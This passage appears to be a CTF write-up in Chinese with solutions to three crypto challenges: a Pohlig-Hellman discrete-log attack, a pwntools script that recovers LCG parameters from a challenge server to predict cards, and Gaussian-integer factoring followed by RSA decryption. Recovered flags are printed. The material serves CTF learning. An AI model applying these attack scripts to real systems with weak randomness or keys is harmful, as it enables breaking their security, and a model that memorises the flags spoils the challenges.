class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;p = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(p))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;q = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(q))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;r = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(r))   </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;y = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(y)) </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;x = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(x)) </span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">p = 1068910928091265978478887270179608140018534288604159452828300604294675735481804963679672853224192480667904101881092533866322948043654533322038484907159945421</span></span><br><span class="line"><span class="string">q = 1711302770747802020613711652777299980542669713888988077474955896217408515180094849053961025086865697904731088087532944829046702427480842253022459937172565651</span></span><br><span class="line"><span class="string">r = 132969813572228739353704467775972551435751558645548804253458782569132362201099158857093676816706297676454547299888531536236748314013888413096371966359860637</span></span><br><span class="line"><span class="string">y = 5385116324746699759660077007129548063211490907227715474654765255668507958312745677683558789874078477569613259930365612562164095274660123330458355653249805062678976259429733060364358954180439218947514191603330532117142653558803034110759332447742304749985874760435453594107494324797235909651178472904825071375135846093354526936559640383917210702874692725723836865724807664892994298377375580807917514349966834376413176898806591411038129330967050554114677719107335006266</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></blockquote><p>DLP，Pohlig–Hellman算法+CRT。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">p = <span class="number">1068910928091265978478887270179608140018534288604159452828300604294675735481804963679672853224192480667904101881092533866322948043654533322038484907159945421</span></span><br><span class="line">q = <span class="number">1711302770747802020613711652777299980542669713888988077474955896217408515180094849053961025086865697904731088087532944829046702427480842253022459937172565651</span></span><br><span class="line">r = <span class="number">132969813572228739353704467775972551435751558645548804253458782569132362201099158857093676816706297676454547299888531536236748314013888413096371966359860637</span></span><br><span class="line">y = <span class="number">5385116324746699759660077007129548063211490907227715474654765255668507958312745677683558789874078477569613259930365612562164095274660123330458355653249805062678976259429733060364358954180439218947514191603330532117142653558803034110759332447742304749985874760435453594107494324797235909651178472904825071375135846093354526936559640383917210702874692725723836865724807664892994298377375580807917514349966834376413176898806591411038129330967050554114677719107335006266</span></span><br><span class="line"></span><br><span class="line">g = <span class="number">3</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">babystep_giantstep</span>(<span class="params">g, y, p, q=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">if</span> q <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        q = p - <span class="number">1</span></span><br><span class="line">    m = <span class="built_in">int</span>(q**<span class="number">0.5</span> + <span class="number">0.5</span>)</span><br><span class="line">    <span class="comment"># Baby step</span></span><br><span class="line">    table = &#123;&#125;</span><br><span class="line">    gr = <span class="number">1</span>  <span class="comment"># g^r</span></span><br><span class="line">    <span class="keyword">for</span> r <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">        table[gr] = r</span><br><span class="line">        gr = (gr * g) % p</span><br><span class="line">    <span class="comment"># Giant step</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        gm = <span class="built_in">pow</span>(g, -m, p)  <span class="comment"># gm = g^&#123;-m&#125;</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    ygqm = y                <span class="comment"># ygqm = y * g^&#123;-qm&#125;</span></span><br><span class="line">    <span class="keyword">for</span> q <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">        <span class="keyword">if</span> ygqm <span class="keyword">in</span> table:</span><br><span class="line">            <span class="keyword">return</span> q * m + table[ygqm]</span><br><span class="line">        ygqm = (ygqm * gm) % p</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Pohlig–Hellman法</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pohlig_hellman_DLP</span>(<span class="params">g, y, p</span>):</span><br><span class="line">    crt_moduli = []</span><br><span class="line">    crt_remain = []</span><br><span class="line">    <span class="keyword">for</span> q, _ <span class="keyword">in</span> factor(p-<span class="number">1</span>):</span><br><span class="line">        x = babystep_giantstep(<span class="built_in">pow</span>(g,(p-<span class="number">1</span>)//q,p), <span class="built_in">pow</span>(y,(p-<span class="number">1</span>)//q,p), p, q)</span><br><span class="line">        <span class="keyword">if</span> (x <span class="keyword">is</span> <span class="literal">None</span>) <span class="keyword">or</span> (x &lt;= <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        crt_moduli.append(q)</span><br><span class="line">        crt_remain.append(x)</span><br><span class="line">    x = crt(crt_remain, crt_moduli)</span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line">xp = pohlig_hellman_DLP(g, y%p, p)</span><br><span class="line">xq = pohlig_hellman_DLP(g, y%q, q)</span><br><span class="line">xr = pohlig_hellman_DLP(g, y%r, r)</span><br><span class="line">x = crt([xp,xq,xr],[p-<span class="number">1</span>,q-<span class="number">1</span>,r-<span class="number">1</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(x)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="string">b&#x27;SYC&#123;D1scr3te_L0g_W1th_Mult1pl3_pr1m35&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="card-game"><a href="#card-game" class="headerlink" title="card_game"></a>card_game</h3><blockquote><p>AL3XEI送给了你这个游戏的关键数据，你能预测接下来要出的牌吗 nc 59.110.20.54 4953</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> cards <span class="keyword">import</span> Heart, Spade, Club, Diamond</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choose_card</span>(<span class="params">num</span>):</span><br><span class="line">    x = (num&gt;&gt;<span class="number">5</span>)%<span class="number">4</span></span><br><span class="line">    <span class="keyword">if</span> x == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> (Heart[(num&gt;&gt;<span class="number">6</span>)%<span class="number">13</span>]), <span class="string">&#x27;Heart&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> x%<span class="number">4</span> == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> (Spade[(num&gt;&gt;<span class="number">6</span>)%<span class="number">13</span>]), <span class="string">&#x27;Spade&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> x%<span class="number">4</span> == <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> (Diamond[(num&gt;&gt;<span class="number">6</span>)%<span class="number">13</span>]), <span class="string">&#x27;Diamond&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> (Club[(num&gt;&gt;<span class="number">6</span>)%<span class="number">13</span>]), <span class="string">&#x27;Club&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">GAME</span>():</span><br><span class="line">    banner = <span class="string">&#x27;&#x27;&#x27; </span></span><br><span class="line"><span class="string"> ####    ##   #####  #####      ####    ##   #    # ###### </span></span><br><span class="line"><span class="string">#    #  #  #  #    # #    #    #    #  #  #  ##  ## #      </span></span><br><span class="line"><span class="string">#      #    # #    # #    #    #      #    # # ## # #####  </span></span><br><span class="line"><span class="string">#      ###### #####  #    #    #  ### ###### #    # #      </span></span><br><span class="line"><span class="string">#    # #    # #   #  #    #    #    # #    # #    # #      </span></span><br><span class="line"><span class="string"> ####  #    # #    # #####      ####  #    # #    # ######</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(banner)</span><br><span class="line"></span><br><span class="line">    meum = <span class="string">&#x27;&#x27;&#x27;option:</span></span><br><span class="line"><span class="string">    1: start game</span></span><br><span class="line"><span class="string">    2: get hint</span></span><br><span class="line"><span class="string">    3: exit</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(meum)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;input your option: &#x27;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        your_input = <span class="built_in">input</span>()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> your_input == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">            n = getPrime(<span class="number">36</span>)</span><br><span class="line">            m = getPrime(<span class="number">16</span>)</span><br><span class="line">            c = getPrime(<span class="number">16</span>)</span><br><span class="line">            seed = getPrime(<span class="number">36</span>)</span><br><span class="line">            out = seed</span><br><span class="line">            <span class="built_in">round</span> = <span class="number">0</span></span><br><span class="line">            score = <span class="number">0</span></span><br><span class="line">            res = []</span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                <span class="built_in">round</span> += <span class="number">1</span></span><br><span class="line">                res = []</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&#x27;round:<span class="subst">&#123;<span class="built_in">round</span>&#125;</span>&#x27;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&#x27;score:<span class="subst">&#123;score&#125;</span>&#x27;</span>)</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">3</span>):</span><br><span class="line">                    out = (out*m+c)%n</span><br><span class="line">                    res.append(out)</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">round</span> == <span class="number">1</span>:</span><br><span class="line">                    <span class="keyword">for</span> i <span class="keyword">in</span> res:</span><br><span class="line">                        card, suit = choose_card(i)</span><br><span class="line">                        <span class="built_in">print</span>(card)</span><br><span class="line">                <span class="keyword">elif</span> <span class="built_in">round</span>==<span class="number">2</span> <span class="keyword">or</span> <span class="built_in">round</span>==<span class="number">3</span>:  <span class="comment">#gift</span></span><br><span class="line">                    <span class="keyword">for</span> i <span class="keyword">in</span> res:</span><br><span class="line">                        card, suit = choose_card(i)</span><br><span class="line">                        <span class="built_in">print</span>(card)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&#x27;gift: <span class="subst">&#123;res&#125;</span>&#x27;</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    cards = []</span><br><span class="line">                    suits = []</span><br><span class="line">                    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(res)):</span><br><span class="line">                        card, suit = choose_card(res[i])</span><br><span class="line">                        cards.append(card)</span><br><span class="line">                        suits.append(suit)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;Give me your guess: (example: Heart_1 Club_2 Diamond_3)&quot;</span>)  </span><br><span class="line">                    <span class="keyword">try</span>:</span><br><span class="line">                        g_1, g_2, g_3 = <span class="built_in">input</span>().split()</span><br><span class="line">                        g_1, g_2, g_3 = g_1.split(<span class="string">&#x27;_&#x27;</span>), g_2.split(<span class="string">&#x27;_&#x27;</span>), g_3.split(<span class="string">&#x27;_&#x27;</span>)</span><br><span class="line">                    <span class="keyword">except</span> ValueError:</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">&quot;Please enter in the correct format.&quot;</span>)</span><br><span class="line">                        <span class="keyword">return</span></span><br><span class="line">                    <span class="keyword">if</span> (g_1[<span class="number">0</span>] == suits[<span class="number">0</span>] <span class="keyword">and</span> g_1[<span class="number">1</span>] == cards[<span class="number">0</span>][<span class="number">15</span>]) <span class="keyword">and</span> (g_2[<span class="number">0</span>] == suits[<span class="number">1</span>] <span class="keyword">and</span> g_2[<span class="number">1</span>] == cards[<span class="number">1</span>][<span class="number">15</span>]) <span class="keyword">and</span> (g_3[<span class="number">0</span>] == suits[<span class="number">2</span>] <span class="keyword">and</span> g_3[<span class="number">1</span>] == cards[<span class="number">2</span>][<span class="number">15</span>]):</span><br><span class="line">                        <span class="keyword">for</span> i <span class="keyword">in</span> cards:</span><br><span class="line">                            <span class="built_in">print</span>(i)</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">&quot;Congratulations! You matched the cards!&quot;</span>)</span><br><span class="line">                        score += <span class="number">1</span></span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        <span class="keyword">for</span> i <span class="keyword">in</span> cards:</span><br><span class="line">                            <span class="built_in">print</span>(i)</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">&quot;Try again!&quot;</span>)</span><br><span class="line">                <span class="keyword">if</span> score == <span class="number">50</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&#x27;The flag is your reward!&#x27;</span>)</span><br><span class="line">                    <span class="built_in">print</span>(flag)</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> your_input == <span class="string">&#x27;2&#x27;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Have you ever heard of LCG?&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> your_input == <span class="string">&#x27;3&#x27;</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    GAME()</span><br></pre></td></tr></table></figure></blockquote><p>代码逻辑本质是LCG，有个坑点，比对的时候，10是0。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> pwnlib.util.iters <span class="keyword">import</span> mbruteforce</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> gcd</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">egcd</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> (b, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        g, y, x = egcd(b % a, a)</span><br><span class="line">        <span class="keyword">return</span> (g, x - (b // a) * y, y)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">modinv</span>(<span class="params">a, m</span>):</span><br><span class="line">    g, x, y = egcd(a, m)</span><br><span class="line">    <span class="keyword">if</span> g != <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&#x27;modular inverse does not exist&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> x % m</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">crack_unknown_increment</span>(<span class="params">states, modulus, multiplier</span>):</span><br><span class="line">    increment = (states[<span class="number">1</span>] - states[<span class="number">0</span>]*multiplier) % modulus</span><br><span class="line">    <span class="keyword">return</span> modulus, multiplier, increment</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">crack_unknown_multiplier</span>(<span class="params">states, modulus</span>):</span><br><span class="line">    multiplier = (states[<span class="number">2</span>] - states[<span class="number">1</span>]) * modinv(states[<span class="number">1</span>] - states[<span class="number">0</span>], modulus) % modulus</span><br><span class="line">    <span class="keyword">return</span> crack_unknown_increment(states, modulus, multiplier)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">crack_unknown_modulus</span>(<span class="params">states</span>):</span><br><span class="line">    diffs = [s1 - s0 <span class="keyword">for</span> s0, s1 <span class="keyword">in</span> <span class="built_in">zip</span>(states, states[<span class="number">1</span>:])]</span><br><span class="line">    zeroes = [t2*t0 - t1*t1 <span class="keyword">for</span> t0, t1, t2 <span class="keyword">in</span> <span class="built_in">zip</span>(diffs, diffs[<span class="number">1</span>:], diffs[<span class="number">2</span>:])]</span><br><span class="line">    modulus = <span class="built_in">abs</span>(reduce(gcd, zeroes))</span><br><span class="line">    <span class="keyword">return</span> crack_unknown_multiplier(states, modulus)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choose_card</span>(<span class="params">num</span>):</span><br><span class="line">    x = (num&gt;&gt;<span class="number">5</span>)%<span class="number">4</span></span><br><span class="line">    <span class="keyword">if</span> x == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> (num&gt;&gt;<span class="number">6</span>)%<span class="number">13</span>, <span class="string">&#x27;Heart&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> x%<span class="number">4</span> == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> (num&gt;&gt;<span class="number">6</span>)%<span class="number">13</span>, <span class="string">&#x27;Spade&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> x%<span class="number">4</span> == <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> (num&gt;&gt;<span class="number">6</span>)%<span class="number">13</span>, <span class="string">&#x27;Diamond&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> (num&gt;&gt;<span class="number">6</span>)%<span class="number">13</span>, <span class="string">&#x27;Club&#x27;</span></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;59.110.20.54&quot;</span>,<span class="number">4953</span>)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;option: &#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">seq = []</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;gift: &#x27;</span>)</span><br><span class="line">seq += <span class="built_in">eval</span>(r.recvline())</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;gift: &#x27;</span>)</span><br><span class="line">seq += <span class="built_in">eval</span>(r.recvline())</span><br><span class="line"><span class="built_in">print</span>(seq)</span><br><span class="line"></span><br><span class="line">n, m, c = crack_unknown_modulus(seq)</span><br><span class="line"><span class="built_in">print</span>((n,m,c))</span><br><span class="line"></span><br><span class="line">out = seq[-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">    <span class="built_in">next</span> = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">        out = (out*m+c)%n</span><br><span class="line">        card,suit = choose_card(out)</span><br><span class="line">        real_card = <span class="built_in">str</span>(card+<span class="number">1</span>).replace(<span class="string">&#x27;10&#x27;</span>,<span class="string">&#x27;0&#x27;</span>).replace(<span class="string">&#x27;11&#x27;</span>,<span class="string">&#x27;J&#x27;</span>).replace(<span class="string">&#x27;12&#x27;</span>,<span class="string">&#x27;Q&#x27;</span>).replace(<span class="string">&#x27;13&#x27;</span>,<span class="string">&#x27;K&#x27;</span>).replace(<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">        <span class="built_in">next</span>.append(<span class="string">f&#x27;<span class="subst">&#123;suit&#125;</span>_<span class="subst">&#123;real_card&#125;</span>&#x27;</span>.encode())</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">next</span> = <span class="string">b&#x27; &#x27;</span>.join(<span class="built_in">next</span>)</span><br><span class="line">    <span class="built_in">print</span>(k,<span class="built_in">next</span>)</span><br><span class="line">    </span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;(example: Heart_1 Club_2 Diamond_3)\n&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">next</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(r.recvall().decode())</span><br><span class="line"></span><br><span class="line"><span class="comment"># Congratulations! You matched the cards!</span></span><br><span class="line"><span class="comment"># The flag is your reward!</span></span><br><span class="line"><span class="comment"># b&#x27;SYC&#123;lcg_a@@@@@ttack&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="EzComplex"><a href="#EzComplex" class="headerlink" title="EzComplex"></a>EzComplex</h3><blockquote><p>And u, my friend: Complex factors! (In a double sense)</p></blockquote><p>高斯整数分解。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">c = <span class="number">122977267154486898127643454001467185956864368276013342450998567212966113302012584153291519651365278888605594000436279106907163024162771486315220072170917153855370362692990814276908399943293854077912175867886513964032241638851526276</span></span><br><span class="line">N = <span class="number">973990451943921675425625260267293227445098713194663380695161260771362036776671793195525239267004528550439258233703798932349677698127549891815995206853756301593324349871567926792912475619794804691721625860861059975526781239293017498</span></span><br><span class="line">GI = GaussianIntegers()</span><br><span class="line">d = divisors(GI(N))</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> d:</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;I&#x27;</span> <span class="keyword">in</span> <span class="built_in">str</span>(k):</span><br><span class="line">        p = <span class="built_in">int</span>(<span class="built_in">abs</span>(k.imag()))</span><br><span class="line">        q = <span class="built_in">int</span>(<span class="built_in">abs</span>(k.real()))</span><br><span class="line">        <span class="keyword">if</span> p.bit_length() <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">382</span>,<span class="number">385</span>) <span class="keyword">and</span> is_prime(p) <span class="keyword">and</span> q.bit_length() <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">382</span>,<span class="number">385</span>) <span class="keyword">and</span> is_prime(q):</span><br><span class="line">            <span class="built_in">print</span>((p,q))</span><br><span class="line">            </span><br><span class="line"><span class="comment"># (8732781022306464325787401448517171026218291389436971731700810979177651389459896422549428444142746055523338740248707, 29962125885196559918101088622575501736433575381042696980660846307183241725227137854663856022170515177120773072848343)</span></span><br><span class="line"><span class="comment"># (29962125885196559918101088622575501736433575381042696980660846307183241725227137854663856022170515177120773072848343, 8732781022306464325787401448517171026218291389436971731700810979177651389459896422549428444142746055523338740248707)</span></span><br></pre></td></tr></table></figure><p>再常规RSA：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">p,q = (<span class="number">8732781022306464325787401448517171026218291389436971731700810979177651389459896422549428444142746055523338740248707</span>, <span class="number">29962125885196559918101088622575501736433575381042696980660846307183241725227137854663856022170515177120773072848343</span>)</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">c = <span class="number">122977267154486898127643454001467185956864368276013342450998567212966113302012584153291519651365278888605594000436279106907163024162771486315220072170917153855370362692990814276908399943293854077912175867886513964032241638851526276</span></span><br><span class="line">f = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = inverse_mod(e,f)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,p*q)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;SYC&#123;D0_you_like_r41n?_i_pref3r_R1_ng&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    